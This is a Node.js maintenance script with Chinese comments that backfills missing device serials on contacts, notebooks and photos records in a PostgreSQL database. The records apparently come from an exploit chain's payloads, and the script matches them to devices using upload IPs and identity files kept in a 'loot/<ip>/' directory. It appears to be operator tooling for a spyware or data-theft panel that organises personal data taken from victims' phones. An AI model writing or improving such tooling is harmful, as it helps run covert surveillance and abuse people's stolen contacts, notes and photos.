#!/usr/bin/env node
/**
 * fix_orphan_serials.js —— 孤儿行归属回填（2026-09-19 操作员批准）
 *
 * 背景：13-17 链的 contacts / notebooks / photos 载荷只带「机型+版本」，靠桶内身份表
 *   唯一匹配才归属；处理时序不巧时 serial 留空（''）→ 面板按设备查不到（DNPF15140DYN 等）。
 *
 * 做法（证据唯一性优先，歧义一律跳过）：
 *   tier1 window     : uploads 表 (ip, serial, ts) 证据，孤儿行 ts ±6h 内**唯一**命中一台设备
 *   tier2 ip-unique  : 该 IP 全时段仅 1 台设备上传过（唯一）
 *   其余（歧义/无证据/ip 为空）→ 跳过并记录
 *
 * 仅更新 serial / ukey / data.serial 三个字段；ukey 用 pgStore.ukeyOf 现算（跑前自动校准）。
 * 用法: node tools/fix_orphan_serials.js [--apply]     缺省 dry-run
 */
const path = require('path');
const fs = require('fs');
const BASE = path.resolve(__dirname, '..');
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const APPLY = process.argv.includes('--apply');
const WINDOW = 6 * 3600 * 1000;
const LOG = '/tmp/orphan_fix_log_' + Date.now() + (APPLY ? '_apply' : '_dry') + '.csv';

const BUILD = {
  contacts:  row => ({ serial: row.serial, name: row.d?.name ?? row.name, phones: row.d?.phones ?? row.phones }),
  notebooks: row => ({ serial: row.serial, source_path: row.d?.source_path ?? row.source_path, title: row.d?.title ?? row.title, content: row.d?.content ?? row.content }),
  photos:    row => ({ serial: row.serial, source_path: row.d?.source_path ?? null, name: row.name, title: row.d?.title ?? null }),
};

const out = fs.createWriteStream(LOG);
const logLine = (o) => out.write(JSON.stringify(o) + '\n');

(async () => {
  const pool = pgStore.pool;
  // ── 1) 证据面：ip -> serial -> sorted ts[] ──
  const ev = await pool.query(
    `SELECT host(ip) AS ip, serial, array_agg(ts ORDER BY ts) AS tss
       FROM uploads WHERE ip IS NOT NULL AND serial IS NOT NULL AND serial <> ''
      GROUP BY 1, 2`);
  const ipMap = new Map();
  for (const r of ev.rows) {
    let m = ipMap.get(r.ip); if (!m) ipMap.set(r.ip, m = new Map());
    m.set(r.serial, r.tss.map(Number));
  }
  console.log('[fix] IP→设备证据加载:', ipMap.size, '个 IP');
  const near = (tss, ts) => {
    let lo = 0, hi = tss.length - 1;
    while (lo <= hi) { const m = (lo + hi) >> 1; if (tss[m] < ts) lo = m + 1; else hi = m - 1; }
    let best = Infinity;
    for (const i of [lo - 1, lo]) if (i >= 0 && i < tss.length) best = Math.min(best, Math.abs(tss[i] - ts));
    return best;
  };
  // ── 证据源②：loot/<ip>/report_*.dec.json 桶内身份文件（s/d2 = 序列号，文件名尾部 = ts）──
  const _lootCache = new Map();
  const lootCands = (ip) => {
    if (_lootCache.has(ip)) return _lootCache.get(ip);
    let m = null;
    try {
      const dir = path.join(BASE, 'loot', ip);
      const fs2 = fs.readdirSync(dir)
        .filter(f => /^report_.*\.dec\.json$/.test(f))
        .sort((a, b) => (Number((b.match(/_(\d+)\.dec\.json$/) || [])[1]) || 0) - (Number((a.match(/_(\d+)\.dec\.json$/) || [])[1]) || 0))
        .slice(0, 100);
      for (const f of fs2) {
        const j = JSON.parse(fs.readFileSync(path.join(dir, f), 'utf8'));
        const sn = j.s || j.d2; if (!sn) continue;
        const ts = Number((f.match(/_(\d+)\.dec\.json$/) || [])[1]) || 0;
        if (!m) m = new Map();
        if (!m.has(sn)) m.set(sn, []);
        m.get(sn).push(ts);
      }
      if (m) for (const tss of m.values()) tss.sort((a, b) => a - b);
    } catch { /* 目录不存在等 → 无该证据 */ }
    _lootCache.set(ip, m);
    return m;
  };
  const pickFrom = (m, ts) => {
    if (!m.size) return null;
    const cands = [];
    for (const [serial, tss] of m) if (near(tss, ts) <= WINDOW) cands.push(serial);
    if (cands.length === 1) return { serial: cands[0], tier: 'window' };
    if (cands.length > 1) return { serial: '', tier: 'window-ambiguous', cands };
    if (m.size === 1) return { serial: [...m.keys()][0], tier: 'ip-unique' };
    return null;
  };
  const resolve = (ip, ts) => {
    if (!ip) return { serial: '', tier: 'no-ip' };
    const m = new Map();
    const m1 = ipMap.get(ip); if (m1) for (const [s, tss] of m1) m.set(s, tss);
    let r = pickFrom(m, ts);
    if (!r || r.tier === 'ip-unique' || (r.serial === '' && r.tier !== 'window-ambiguous')) {
      // m 为空 / 无窗口命中 / 仅 ip-unique 兜底 → 叠加桶内 report 身份证据再试
      const m2 = lootCands(ip);
      if (m2 && m2.size) {
        for (const [s, tss] of m2) if (!m.has(s)) m.set(s, tss);
        r = pickFrom(m, ts) || r;
      }
    }
    if (!r) r = m.size ? { serial: '', tier: 'ambiguous', cands: [...m.keys()] } : { serial: '', tier: 'no-evidence' };
    return r;
  };

  // ── 2) 说明：库内 ukey 来自历代公式（P4.3 等多次调整），拿今日公式对比历史行必然不一致
  //   （首跑实测 0/400），回填正确性改由三层防线保证：
  //   ① 现算用同一份 pgStore.ukeyOf（与当前管线一致 → 未来重放同键可去重）
  //   ② 写库前对既有 ukey 全量查重（ukey 唯一索引冲突防线）
  //   ③ 同内容"双胞胎"检测（内容已被绑定过 → 跳过，防面板可见重复）
  {
    const p1 = pgStore.ukeyOf('contacts', 'contacts', { serial: 'X', name: 'a', phones: 'b' });
    const p2 = pgStore.ukeyOf('contacts', 'contacts', { serial: 'X', name: 'a', phones: 'b' });
    if (p1 !== p2) { console.error('ukeyOf 不确定，中止'); process.exit(1); }
    console.log('[fix] ukeyOf 确定性自检通过');
  }

  // ── 3) 逐表处理 ──
  const summary = { byTier: {}, upd: {}, skip: {}, dup: {}, twin: {} };
  for (const [tbl, build] of Object.entries(BUILD)) {
    const r = await pool.query(`SELECT *, data AS d FROM ${tbl} WHERE COALESCE(serial,'') = ''`);
    const rows = r.rows;
    // 现有 ukey 全集（防重复插入撞唯一键）
    const have = await pool.query(`SELECT ukey, id FROM ${tbl} WHERE ukey IS NOT NULL`);
    const ukSet = new Map(have.rows.map(x => [x.ukey, x.id]));
    // 同内容"双胞胎"集（内容已被绑定过 → 跳过，防面板可见重复）
    let twinSet;
    if (tbl === 'contacts') {
      const t = await pool.query(`SELECT name, phones FROM ${tbl} WHERE COALESCE(serial,'') <> ''`);
      twinSet = new Set(t.rows.map(x => (x.name || '') + '\u0001' + (x.phones || '')));
    } else if (tbl === 'notebooks') {
      const t = await pool.query(`SELECT title, source_path FROM ${tbl} WHERE COALESCE(serial,'') <> ''`);
      twinSet = new Set(t.rows.map(x => (x.title || '') + '\u0001' + (x.source_path || '')));
    } else {
      const t = await pool.query(`SELECT name, COALESCE(data->>'source_path','') AS sp FROM ${tbl} WHERE COALESCE(serial,'') <> ''`);
      twinSet = new Set(t.rows.map(x => (x.name || '') + '\u0001' + (x.sp || '')));
    }
    const twinKey = (row) => (tbl === 'contacts')
      ? (row.name || '') + '\u0001' + (row.phones || '')
      : (tbl === 'notebooks')
        ? (row.title || '') + '\u0001' + (row.source_path || '')
        : (row.name || '') + '\u0001' + ((row.d && row.d.source_path) || '');
    const batch = [];
    let updated = 0, skipped = 0, dup = 0, twins = 0;
    for (const row of rows) {
      const ip = row.ip ? String(row.ip) : '';
      const ts = Number(row.ts) || 0;
      const { serial, tier } = resolve(ip, ts);
      summary.byTier[tier] = (summary.byTier[tier] || 0) + 1;
      if (!serial) { skipped++; logLine({ tbl, id: row.id, ip, ts, action: 'skip', tier }); continue; }
      if (twinSet.has(twinKey(row))) { twins++; logLine({ tbl, id: row.id, ip, ts, action: 'dup-content', serial, tier }); continue; }
      const rec = build({ ...row, serial });
      const nuk = pgStore.ukeyOf(tbl, tbl, rec);
      if (ukSet.has(nuk)) { dup++; logLine({ tbl, id: row.id, ip, ts, action: 'dup-ukey', serial, target: ukSet.get(nuk), tier }); continue; }
      ukSet.set(nuk, row.id);
      batch.push({ id: row.id, serial, nuk, ip, ts, tier });
      logLine({ tbl, id: row.id, ip, ts, action: 'update', serial, tier });
    }
    if (APPLY) {
      for (let i = 0; i < batch.length; i += 500) {
        const part = batch.slice(i, i + 500);
        const c = await pool.connect();
        try {
          await c.query('BEGIN');
          for (const b of part) {
            await c.query(
              `UPDATE ${tbl} SET serial=$1, ukey=$2,
                 data = CASE WHEN data IS NOT NULL AND data ? 'serial'
                             THEN jsonb_set(data, '{serial}', to_jsonb($1::text)) ELSE data END
               WHERE id=$3 AND COALESCE(serial,'')=''`, [b.serial, b.nuk, b.id]);
          }
          await c.query('COMMIT'); updated += part.length;
        } catch (e) { await c.query('ROLLBACK'); console.error(`[fix] 批次回滚 @${i}:`, e.message); }
        finally { c.release(); }
      }
      console.log(`[fix] ${tbl}: 待更新 ${batch.length} → 实际提交 ${updated}｜跳过 ${skipped}｜双胞胎 ${twins}｜撞键 ${dup}`);
    } else {
      console.log(`[fix] ${tbl}: 拟更新 ${batch.length}｜跳过 ${skipped}｜双胞胎 ${twins}｜撞键 ${dup}（dry-run 未写库）`);
    }
    summary.upd[tbl] = batch.length; summary.skip[tbl] = skipped; summary.dup[tbl] = dup; summary.twin[tbl] = twins;
  }
  console.log('[fix] tier 分布:', JSON.stringify(summary.byTier));
  console.log('[fix] 决策日志:', LOG);
  out.end(); await pgStore.close(); process.exit(0);
})().catch(e => { console.error('[fix] fatal', e); process.exit(1); });
